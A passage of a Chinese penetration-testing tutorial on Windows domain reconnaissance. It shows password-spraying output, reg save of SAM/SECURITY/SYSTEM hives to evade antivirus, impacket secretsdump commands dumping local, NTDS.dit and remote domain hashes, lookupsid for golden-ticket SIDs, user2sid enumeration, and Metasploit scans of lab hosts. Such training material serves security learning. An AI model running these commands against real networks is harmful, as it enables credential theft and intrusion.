<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> This might take a <span class="token keyword">while</span> depending on the total number of users
<span class="token number">1</span> of <span class="token number">6</span> users tested2 of <span class="token number">6</span> users tested3 of <span class="token number">6</span> users tested<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> SUCCESS<span class="token operator">!</span> User<span class="token punctuation">:</span>testPass Password<span class="token punctuation">:</span>w<span class="token operator">!</span><span class="token number">23456</span>
<span class="token number">4</span> of <span class="token number">6</span> users tested<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> SUCCESS<span class="token operator">!</span> User<span class="token punctuation">:</span>webManager Password<span class="token punctuation">:</span>w<span class="token operator">!</span><span class="token number">23456</span>
<span class="token number">5</span> of <span class="token number">6</span> users tested<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> SUCCESS<span class="token operator">!</span> User<span class="token punctuation">:</span>dba Password<span class="token punctuation">:</span>w<span class="token operator">!</span><span class="token number">23456</span>
<span class="token number">6</span> of <span class="token number">6</span> users tested<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Password spraying is complete
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Any passwords that were successfully sprayed have been output to sprayed<span class="token operator">-</span>creds<span class="token punctuation">.</span>txt
</code></pre>
<p><strong>枚举的结果：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\PS <span class="token operator">&gt;</span> type <span class="token punctuation">.</span>\sprayed<span class="token operator">-</span>creds<span class="token punctuation">.</span>txt
testPass<span class="token punctuation">:</span>w<span class="token operator">!</span><span class="token number">23456</span>
webManager<span class="token punctuation">:</span>w<span class="token operator">!</span><span class="token number">23456</span>
dba<span class="token punctuation">:</span>w<span class="token operator">!</span><span class="token number">23456</span>
</code></pre>
<p>参考文章：<code>https://payloads.online/archivers/2018-05-02/1</code>    感谢倾旋</p>
<hr>
<h2><a id="5343_dns_9397"></a>5.3.4.3 不同环境下域dns记录信息收集方法</h2>
<p>书上介绍了DNS信息查询方法：</p>
<pre><code class="prism language-c">DNS Manager

Dnscmd

使用 Powershell进行dns信息查询

adidnsdump

SharpAdidnsdump
</code></pre>
<p>五种方法来获取不通环境下域dns信息，这里后期科补~~~</p>
<hr>
<h2><a id="5344_impacketdayuSixteenth_Day_1628"></a>5.3.4.4 impacket框架之域信息获取（dayu-Sixteenth Day)</h2>
<p>本篇文章讲述impacket套件内部分常用域、内网信息收集工具使用，将会用到的工具，secretsdump、lookupsid、 esentutl、ticketer</p>
<h2><a id="Secretsdump_1631"></a>Secretsdump</h2>
<p>Secretsdump常用于本地、远程hash导出，具体使用方法如下：</p>
<p>在渗透测试工作中，为了躲避杀软等防护产品，dump目标机hash通常会进行以下操作。</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\<span class="token operator">&gt;</span> reg<span class="token punctuation">.</span>exe save hklm\sam c<span class="token punctuation">:</span>\sam<span class="token punctuation">.</span>save

C<span class="token punctuation">:</span>\<span class="token operator">&gt;</span> reg<span class="token punctuation">.</span>exe save hklm\security c<span class="token punctuation">:</span>\security<span class="token punctuation">.</span>save 

C<span class="token punctuation">:</span>\<span class="token operator">&gt;</span> reg<span class="token punctuation">.</span>exe save hklm\system c<span class="token punctuation">:</span>\system<span class="token punctuation">.</span>save 
</code></pre>
<p>以上三个注册表项解释:</p>
<p>SAM存储域用户或本地用户的数据，包括域用户组名或本机用户组、用户名及密码哈希等。</p>
<p>Security存储用户安全策略，存储域用户、本地用户登陆记录，缓存的登陆用户凭证，例如domain cache</p>
<p>system用来解密SAM和Security</p>
<p>之后使用secretsdump进行hash内容导出，具体方法如下:</p>
<p>1）本地hash导出</p>
<p>获取SAM中hash</p>
<pre><code class="prism language-c">secretsdump<span class="token punctuation">.</span>py <span class="token operator">-</span>sam sam<span class="token punctuation">.</span>save <span class="token operator">-</span>system system<span class="token punctuation">.</span>save LOCAL
</code></pre>
<p>获取security.save中缓存的登陆用户凭证和LSA Secres</p>
<pre><code class="prism language-c">secretsdump<span class="token punctuation">.</span>py <span class="token operator">-</span>security security<span class="token punctuation">.</span>save <span class="token operator">-</span>system system<span class="token punctuation">.</span>save LOCAL
</code></pre>
<p>获取sam security 中所有内容</p>
<pre><code class="prism language-c">secretsdump<span class="token punctuation">.</span>py <span class="token operator">-</span>sam sam<span class="token punctuation">.</span>save <span class="token operator">-</span>security security<span class="token punctuation">.</span>save <span class="token operator">-</span>system system<span class="token punctuation">.</span>save LOCAL
</code></pre>
<p><strong>2）域用户hash导出</strong></p>
<p>域用户hash导出还需要NTDS.dit活动目录数据库文件，具体导出方法请查看gitbook《转储域账 户哈希值》</p>
<p>使用以下命令导出域所有用户hash</p>
<pre><code class="prism language-c">python secretsdump<span class="token punctuation">.</span>py <span class="token operator">-</span>ntds NTDS<span class="token punctuation">.</span>dit <span class="token operator">-</span>system SYSTEM LOCAL <span class="token operator">-</span>outputfile
lol<span class="token punctuation">.</span>hash 
</code></pre>
<pre><code class="prism language-c">secretsdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>ntds NTDS<span class="token punctuation">.</span>dit <span class="token operator">-</span>system temp_sys<span class="token punctuation">.</span>hiv LOCAL<span class="token operator">-</span>outputfile lol<span class="token punctuation">.</span>hash
</code></pre>
<pre><code class="prism language-c">proxychains python secretsdump<span class="token punctuation">.</span>py rootkit<span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token punctuation">.</span>x<span class="token punctuation">.</span>x
</code></pre>
<p>3）远程导出hash</p>
<p>secretsdump还支持远程导岀hash，支持socks代理传输数据，需提供远程服务器管理员账号凭证，支持两种方式读取活动目录数据库，Vssadmin和DRSUAPI(Directory Replication Service API)远程目录复制协议api</p>
<p>secretsdump远程导出hash参数介绍</p>
<p><img src="https://img-blog.csdnimg.cn/20201002202641685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
导出远程机hash及缓存记录</p>
<pre><code class="prism language-c">secretsdump<span class="token punctuation">.</span>exe rootkit<span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token punctuation">.</span>x<span class="token punctuation">.</span>x
</code></pre>
<p>使用 Vssadmin复制用户数据库文件的方式进行远程hash导出</p>
<pre><code class="prism language-c">secretsdump<span class="token punctuation">.</span>exe rootkit<span class="token operator">/</span>administrator@<span class="token number">192.168</span><span class="token punctuation">.</span>x<span class="token punctuation">.</span>x <span class="token operator">-</span>just<span class="token operator">-</span>dc <span class="token operator">-</span>use<span class="token operator">-</span>vss
</code></pre>
<h2><a id="Esentutl_1708"></a>Esentutl</h2>
<p>esentutl常用于从dit文件提取域内信息的工具，具体使用命令：</p>
<pre><code class="prism language-c">esentutl<span class="token punctuation">.</span>exe NTDS<span class="token punctuation">.</span>dit export<span class="token operator">-</span>table datatable <span class="token operator">&gt;</span>log<span class="token punctuation">.</span>txt
</code></pre>
<h2><a id="Ticket_1714"></a>Ticket</h2>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>wh0ale<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span><span class="token number">2018</span><span class="token operator">/</span><span class="token number">12</span><span class="token operator">/</span><span class="token number">25</span><span class="token operator">/</span><span class="token number">2018</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">25</span><span class="token operator">-</span>域渗透之票据<span class="token operator">/</span>
</code></pre>
<h2><a id="lookupsidpy_1719"></a>lookupsid.py</h2>
<p>可查看远程目标机器或域控所有用户内容(需提供域任意用户凭证)</p>
<p>lookupsid在读取远程机器用户信息时，同时会输出域SID，域SID是生成黄金票据所需数据。</p>
<pre><code class="prism language-c">lookupsid<span class="token punctuation">.</span>py domain<span class="token operator">/</span>user<span class="token punctuation">:</span>password@ip
</code></pre>
<hr>
<h2><a id="5345_user2sidsid2user_1729"></a>5.3.4.5 域信息收集之user2sid，sid2user</h2>
<p>使用场景：当前内网环境有域环境，使用nbtscan或者nltest获取到域控的IP，但是没有域用户的账号密码</p>
<p>作用：使用 sid2user 和 user2sid 枚举猜测出域用户名，并通过弱口令获取域用户的权限<br>
下载地址：</p>
<pre><code class="prism language-c">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>greatagain<span class="token punctuation">.</span>dbappsecurity<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn<span class="token operator">/</span>#<span class="token operator">/</span>publicarea<span class="token operator">/</span>tooldisk<span class="token operator">?</span>path<span class="token operator">=</span><span class="token number">412</span><span class="token operator">/</span><span class="token number">2430</span>
</code></pre>
<p>目前无法访问！</p>
<p><strong>使用</strong></p>
<pre><code class="prism language-c">user2sid<span class="token punctuation">.</span>exe \\域控IP 域用户名 
</code></pre>
<p>域里面域管默认为administrator用户，且sid为500</p>
<p>那么先通过administrator域管获取域用户的sid</p>
<pre><code class="prism language-c">user2sid<span class="token punctuation">.</span>exe \\<span class="token number">192.168</span><span class="token punctuation">.</span>x<span class="token punctuation">.</span>x administrator
</code></pre>
<p>得到域用户的sd为S-1-5-21-675002476-827761xxxx…<br>
<img src="https://img-blog.csdnimg.cn/20201002220240117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/2020100222025865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
总结文章：</p>
<pre><code class="prism language-c">freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>sectool<span class="token operator">/</span><span class="token number">175208.</span>html
</code></pre>
<hr>
<h2><a id="54__1764"></a>5.4 工作组环境信息搜集</h2>
<h2><a id="541_MSF1_1765"></a>5.4.1 基于MSF发现内网存活主机（1）</h2>
<p>攻击机： 192.168.1.5 Debian</p>
<p>靶机： 192.168.1.2 Windows 7</p>
<p>192.168.1.119 Windows 2003</p>
<p><strong>MSF的search支持type搜索：</strong></p>
<pre><code class="prism language-c">msf <span class="token operator">&gt;</span> search scanner type<span class="token punctuation">:</span>auxiliary 

Matching Modules
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> 

Name Disclosure Date Rank Check Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>appletv<span class="token operator">/</span>appletv_display_image normal No Apple TV Image Remote Control
auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>appletv<span class="token operator">/</span>appletv_display_video normal No Apple TV Video Remote Control
auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>smb<span class="token operator">/</span>check_dir_file normal Yes SMB Scanner CheckFile<span class="token operator">/</span>Directory Utility
auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>teradata<span class="token operator">/</span>teradata_odbc_sql <span class="token number">2018</span>‐<span class="token number">03</span>‐<span class="token number">29</span> normal Yes Teradata ODBC SQL Query Module
auxiliary<span class="token operator">/</span>bnat<span class="token operator">/</span>bnat_scan normal Yes BNAT Scanner
auxiliary<span class="token operator">/</span>gather<span class="token operator">/</span>citrix_published_applications normal No Citrix MetaFrame ICA Published Applications Scanner
auxiliary<span class="token operator">/</span>gather<span class="token operator">/</span>enum_dns normal No DNS Record Scanner and Enumerator
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>winrm<span class="token operator">/</span>winrm_cmd normal Yes WinRM Command Runner
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>winrm<span class="token operator">/</span>winrm_login normal Yes WinRM Login Utility
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>winrm<span class="token operator">/</span>winrm_wql normal Yes WinRM WQL Query Runner
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>wproxy<span class="token operator">/</span>att_open_proxy <span class="token number">2017</span>‐<span class="token number">08</span>‐<span class="token number">31</span> normal Yes Open WAN‐to‐LAN proxy on AT<span class="token operator">&amp;</span>T routers
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>wsdd<span class="token operator">/</span>wsdd_query normal Yes WS‐Discovery Information Discovery
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>x11<span class="token operator">/</span>open_x11 normal Yes X11 No‐Auth Scanner
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002222657272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">第一季主要介绍 scanner 下的五个模块，辅助发现内网存活主机，分别为：
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
</code></pre>
<p><strong>1、基于scanner/http/http_version发现HTTP服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
​
Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
Proxies no A proxy chain of format type<span class="token punctuation">:</span>host<span class="token punctuation">:</span>port<span class="token punctuation">[</span><span class="token punctuation">,</span>type<span class="token punctuation">:</span>host<span class="token punctuation">:</span>port<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
RPORT <span class="token number">80</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
SSL false no Negotiate SSL<span class="token operator">/</span>TLS <span class="token keyword">for</span> outgoing connections
THREADS <span class="token number">20</span> yes The number of concurrent threads
VHOST no HTTP server virtual host 
​
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
​
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">80</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">27</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">10</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">63</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">24</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">82</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">103</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">80</span> Microsoft‐IIS<span class="token operator">/</span><span class="token number">6.0</span> <span class="token punctuation">(</span> Powered by ASP<span class="token punctuation">.</span>NET <span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">129</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">154</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">182</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">71</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">205</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">231</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">90</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002222824545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>2、基于scanner/smb/smb_version发现SMB服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
SMBDomain <span class="token punctuation">.</span> no The Windows domain to use <span class="token keyword">for</span> authentication
SMBPass no The password <span class="token keyword">for</span> the specified username
SMBUser no The username to authenticate as
THREADS <span class="token number">20</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">445</span> ‐ Host is running Windows <span class="token number">7</span> Ultimate SP1 <span class="token punctuation">(</span>build<span class="token punctuation">:</span><span class="token number">7601</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>name<span class="token punctuation">:</span>JOHN‐PC<span class="token punctuation">)</span> <span class="token punctuation">(</span>workgroup<span class="token punctuation">:</span>WORKGROUP <span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">40</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">15</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">60</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">23</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">79</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">445</span> ‐ Host is running Windows <span class="token number">2003</span> R2 SP2 <span class="token punctuation">(</span>build<span class="token punctuation">:</span><span class="token number">3790</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>name<span class="token punctuation">:</span>WIN03X64<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">103</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">128</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">154</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">181</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">70</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">206</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">231</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">90</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002222848324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>3、基于scanner/ftp/ftp_version发现FTP服务</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
​
Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
FTPPASS mozilla@example<span class="token punctuation">.</span>com no The password <span class="token keyword">for</span> the specified username
FTPUSER anonymous no The username to authenticate as
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
RPORT <span class="token number">21</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads 
​
msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
​
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">51</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">19</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">52</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">20</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">100</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">39</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ FTP Banner<span class="token punctuation">:</span> <span class="token string">'220 Microsoft FTP Service\x0d\x0a'</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">103</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">40</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">133</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">51</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">183</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">71</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">197</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">76</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">229</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">89</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">231</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">90</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">256</span> of <span class="token number">256</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002222922235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>4、基于scanner/discovery/arp_sweep发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
INTERFACE no The name of the interface
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> yes The target address range or CIDR identifier
SHOST no Source IP Address
SMAC no Source MAC Address
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">5</span> yes The number of seconds to wait <span class="token keyword">for</span> new data 

